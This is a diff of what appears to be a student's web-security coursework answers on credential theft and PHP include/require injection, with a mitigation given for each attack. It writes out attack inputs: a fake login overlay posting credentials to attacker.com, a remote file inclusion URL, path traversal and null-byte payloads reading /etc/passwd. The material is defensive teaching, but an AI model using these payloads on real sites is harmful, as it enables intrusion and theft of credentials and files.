@@ -30,29 +30,36 @@ Ways to steal credentials:
     - or just add a huge Login-Banner over the page: `<div style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:1000;"><form action='http://attacker.com/capture_credentials.php' method='post'><input type='text' name='username'><input type='password' name='password'><input type='submit' value='Login'></form></div>`
 
 ## Explain how PHP-code-injections via include / require could be achieved - and prevented. (25)
-Again there can be different ways to manipulate the parameter of include or require. But then multiple ways are possible for exploitation. 
 
-Manipulation:
-- When `include('content/' . $_GET['page'] . '.php');` is used you can simply maniupulate the URL and include other files then expected. 
-  - Exploitation: `http://example.com/?page=http://attacker.com/malicious`
-    - Prepared File on a Webserver has to be provided by the attacker.
-    - After successfull infiltration, PHP Code execution is possible and might give access to other sensitive files, e.g. Database connection information, `/etc/passwd`
-    - This attack reqires in a setting PHP configuration to set like this:`allow_url_include = On`
-  - Mitigation:
-    - Simply turn off the setting: `allow_url_include = Off`
-- Lets go on with the last example and assume that `allow_url_include = Off` is set.
-  - Exploitation: http://example.com/?page=admin
-    - You still might be able to browse into other files: e.g there might be an admin.php waiting for us, that could be accessed or still database configuration might be somewhere stored in a php File
-    - You might need to extend this attack and upload your own file via an other exploit, like unchecked file extensions on a Picture-Upload-Page on the same server.
-    - Mitigation: Add input validation for expected values in $_GET['page']
-    ```PHP
+There are different ways to manipulate the parameter of `include` or `require`. Multiple methods of exploitation are possible.
+
+### Manipulation:
+
+- When `include('content/' . $_GET['page'] . '.php');` is used, you can simply manipulate the URL and include files other than expected.
+  - **Exploitation**: `http://example.com/?page=http://attacker.com/malicious`
+    - A prepared file on a web server has to be provided by the attacker.
+    - After successful infiltration, PHP code execution is possible and might give access to other sensitive files, e.g., database connection information, `/etc/passwd`.
+    - This attack requires a PHP configuration setting like this: `allow_url_include = On`.
+  - **Mitigation**:
+    - Simply turn off the setting: `allow_url_include = Off`.
+
+  - Let's continue with the last example and assume that `allow_url_include = Off` is set.
+
+    - **Exploitation**: `http://example.com/?page=admin`
+      - You might still be able to browse into other files: e.g., there might be an `admin.php` waiting for us, that could be accessed or database configuration might be stored somewhere in a PHP file.
+      - You might need to extend this attack and upload your own file via another exploit, like unchecked file extensions on a picture-upload page on the same server.
+      - **Mitigation**: Add input validation for expected values in `$_GET['page']`.
+
+      ```php
       $allowedPages = ['home', 'about', 'contact']; // List of allowed pages
       $page = $_GET['page'] ?? 'default'; // Default page if none specified
 
       if (in_array($page, $allowedPages)) { ... }
-    ```
-    moreover you should add absolute paths instead of relative paths to block transversal movement:
-    ```PHP
+      ```
+
+      Moreover, you should add absolute paths instead of relative paths to block traversal movement and add error handling to prevent the next point I will mention:
+
+      ```php
       define('BASE_PATH', realpath('content/')); // Ensure the base path is absolute and normalized
       $page = $_GET['page'] ?? 'default';
       if (in_array($page, $allowedPages)) {
@@ -65,9 +72,16 @@ Manipulation:
       } else {
           include(BASE_PATH . '/error.php');
       }
-    ```
+      ```
 
-  
+  - Error messages can give information about internal structures and so support further attacks.
+    - **Exploit**: Attacker tries invalid values and the system returns full paths and names. E.g., the script is hosted at a free hoster and the attacker creates a free account and includes his own scripts with file access rights set to magical 777. So he is able to access his own scripts via 
+    `http://example.com/?page=../../../attacker_user_on_freehost/haxx0r_file`
+    - **Mitigation** Just like above.
+
+  - Another exploit in very old versions was null byte injection: `http://example.com/?page=../../../etc/passwd%00`
+    - **Exploitation**: Here, `%00` represents a null byte, which could effectively terminate the string at the desired location and potentially allow access to the `/etc/passwd` file. Modern PHP versions, however, are not susceptible to null byte injection.
+    - **Mitigation**: Use supported and updated software versions.
 
 
 ## Discuss how PRNGs could put session-management at risk. (25)
